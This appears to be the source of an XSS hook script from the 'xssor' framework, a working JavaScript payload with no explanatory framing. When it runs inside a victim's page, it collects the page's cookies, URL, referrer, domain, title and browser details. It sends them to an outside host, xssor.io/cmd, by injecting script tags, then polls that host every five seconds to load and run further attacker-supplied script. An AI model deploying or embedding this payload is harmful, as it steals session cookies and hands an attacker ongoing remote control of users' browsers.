/*xssor.io*/
xssor = {};
xssor.cmd_url = 'http://xssor.io/cmd';
xssor.gone = 0;
xssor.done = 0;

xssor.json2kvstr = function (o) {
    var x = "";
    for (var i in o) {
        x += i + '=' + escape(o[i]) + '&';
    }
    return x.substring(0, x.length - 1);
};
xssor.injscript = function (a, b) {
    var o = document.createElement("script");
    o.type = "text/javascript";
    o.src = a;
    if (b) {
        if (!window.ActiveXObject) {
            o.onload = b;
        } else {
            o.onreadystatechange = function () {
                if (o.readyState == 'loaded' || o.readyState == 'complete') {
                    b();
                }
            };
        }
    }
    document.getElementsByTagName("body")[0].appendChild(o);
    return o;
};

xssor.info = {};
xssor.info.pid = 'ywabbps';
xssor.info.referrer = document.referrer;
xssor.info.location = window.location.href;
xssor.info.toplocation = top.location.href;
try {
    xssor.info.cookie = document.cookie;
} catch(error) {
    xssor.info.cookie = "-";
};
xssor.info.domain = document.domain;
xssor.info.title = document.title;
xssor.info.charset = document.characterSet ? document.characterSet : document.charset;
xssor.info.platform = navigator.platform;
xssor.info.screen = function () {
    var c = "";
    if (self.screen) {
        c = screen.width + "x" + screen.height;
    }
    return c;
}();
xssor.info.plugins = '';
if (window.ActiveXObject) {
    xssor.info.lang = navigator.systemLanguage;
    var __c = null;
    try {
        __c = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
    } catch (e) {}
    if (__c) {
        xssor.info.plugins = 'Shockwave Flash ' + __c.GetVariable('$version');
    }
} else {
    xssor.info.lang = navigator.language;
    if (navigator.plugins && navigator.plugins.length > 0) {
        for (var i = 0; i < navigator.plugins.length; i++) {
            xssor.info.plugins += navigator.plugins[i].name + ',' + navigator.plugins[i].description + '|';
        }
    }
}

xssor.tunnel = function () {
    if (xssor.done == 0) {
        var a = xssor.injscript(xssor.cmd_url + '?' + xssor.i + '&date=' + new Date().getTime());
    }
    if (xssor.done == 1) {
        var a = xssor.injscript(xssor.cmd_url + '?' + 'pid=' + xssor.info.pid + '&date=' + new Date().getTime());
        setTimeout(function () {
            document.body.removeChild(a);
        }, 500);
    }
};

function go() {
    if(xssor.gone) return;
    xssor.gone = 1;
    xssor.i = xssor.json2kvstr(xssor.info);
    xssor.tunnel();
    setInterval(function () {
        xssor.tunnel();
    }, 5000);
}
window.onload = function () {
    setTimeout("go()", 1 * 1000);
};setTimeout("go()", 5 * 1000);
